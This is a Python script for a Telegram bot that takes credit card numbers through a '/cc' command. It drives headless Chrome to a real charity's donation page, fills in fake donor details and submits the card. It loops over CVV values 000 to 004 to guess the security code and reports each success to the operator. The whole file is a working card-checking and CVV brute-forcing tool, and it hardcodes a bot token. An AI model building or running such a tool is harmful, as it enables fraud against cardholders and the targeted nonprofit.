import logging
import time
import telebot
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Telegram Bot Token
BOT_TOKEN = "8064844545:AAEcy08ka2ES-ReO7Xmkxh7GtXJAbL9749c"
ADMIN_ID = 1985648746  # Replace with your Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)

# Headless Chrome Setup
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

service = Service("/usr/local/bin/chromedriver")

# Function to Initialize WebDriver
def start_driver():
    return webdriver.Chrome(service=service, options=chrome_options)

# Function to Wait for an Element
def wait(xpath, driver):
    return WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, xpath)))

# Function to Click Element Safely
def safe_click(xpath, driver):
    try:
        element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, xpath)))
        
        # Scroll to element before clicking
        driver.execute_script("arguments[0].scrollIntoView(true);", element)
        time.sleep(1)  # Let page adjust
        
        # Try Selenium Click
        try:
            element.click()
        except:
            # If normal click fails, try JavaScript click
            driver.execute_script("arguments[0].click();", element)
        
        return True
    
    except Exception as e:
        logging.error(f"⚠️ Unable to click element: {xpath} | Error: {e}")
        bot.send_message(ADMIN_ID, f"⚠️ Unable to click element: {xpath}")
        return False

# Function to Process Payment
def process_payment(cc_num, cc_exp, cc_cvv):
    driver = start_driver()
    driver.get("https://riverfront.org/donate/")

    try:
        # Fill Personal Information
        wait("//*[@id='cog-input-auto-0']", driver).send_keys("John")  # First Name
        wait("//*[@id='cog-input-auto-1']", driver).send_keys("Doe")  # Last Name
        wait("//*[@id='cog-1']", driver).send_keys("1234567890")  # Phone
        wait("//*[@id='cog-2']", driver).send_keys("nimojikffu@gmail.com")  # Email
        wait("//*[@id='cog-3-line1']", driver).send_keys("123 Main St")  # Address
        wait("//*[@id='cog-3-city']", driver).send_keys("New York")  # City

        # Select State
        if safe_click("//*[@id='cog-3-state']", driver):
            time.sleep(1)
            safe_click("//*[@id='cog-3-state-option-New York']/div/span", driver)

        # Enter Zip Code
        wait("//*[@id='cog-3-zip-code']", driver).send_keys("10001")

        # Select $100 Donation
        safe_click("//*[@id='post-38507']/div/div/section[2]/div/div/div/div[3]/div/form/div/div/div/div[2]/div[4]/fieldset/div[1]/div[1]/div/label[3]/span[1]/span", driver)

        # Select Rowing Stewards Fund
        safe_click("//*[@id='post-38507']/div/div/section[2]/div/div/div/div[3]/div/form/div/div/div/div[2]/div[7]/fieldset/div[1]/div[1]/div/label[6]/span[1]/input", driver)

        # Try CVVs 000 to 004
        for test_cvv in ["000", "001", "002", "003", "004"]:
            wait("//*[@id='cardNumber']", driver).clear()
            wait("//*[@id='cardNumber']", driver).send_keys(cc_num)  # Card Number
            wait("//*[@id='expirationDate']", driver).clear()
            wait("//*[@id='expirationDate']", driver).send_keys(cc_exp)  # Expiry Date
            wait("//*[@id='cvv']", driver).clear()
            wait("//*[@id='cvv']", driver).send_keys(test_cvv)  # CVV

            # Check if ZIP Code Field is Required
            try:
                zip_field = driver.find_element(By.XPATH, "//*[@id='postalCode']")
                if zip_field.is_displayed():
                    zip_field.send_keys("10001")  # Enter ZIP Code if required
            except:
                pass  # Skip ZIP if not required

            # Click Submit
            safe_click("//*[@id='post-38507']/div/div/section[2]/div/div/div/div[3]/div/form/div/div/div/div[2]/div[15]/button", driver)

            time.sleep(5)  # Wait for response
            
            # Check if Payment Success or Failed
            page_source = driver.page_source
            if "Payment Successful" in page_source:
                bot.send_message(ADMIN_ID, f"✅ Payment successful with CVV {test_cvv}!")
                driver.quit()
                return True
        
        bot.send_message(ADMIN_ID, "❌ All CVVs tested!")
        driver.quit()
        return False

    except Exception as e:
        logging.error(f"Error: {e}")
        bot.send_message(ADMIN_ID, "⚠️ An error occurred!")
        driver.quit()
        return False

# Telegram Command Handler for /cc
@bot.message_handler(commands=['cc'])
def handle_cc(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    try:
        cc_details = message.text.split(" ")[1]
        cc_parts = cc_details.split("|")

        if len(cc_parts) != 4:
            bot.reply_to(message, "⚠️ Invalid format! Use: `/cc 4519120000002321|08|25|302`")
            return

        cc_num, cc_exp, cc_year, cc_cvv = cc_parts
        cc_exp = f"{cc_exp}/{cc_year}"  # Convert to MM/YY format

        bot.send_message(ADMIN_ID, f"🔄 Processing payment for `{cc_num}`...")
        process_payment(cc_num, cc_exp, cc_cvv)

    except IndexError:
        bot.reply_to(message, "⚠️ Please provide CC details! Format: `/cc 4519120000002321|08|25|302`")
    except Exception as e:
        logging.error(f"Error: {e}")
        bot.send_message(ADMIN_ID, "⚠️ Something went wrong!")

# Start the Telegram Bot
bot.polling()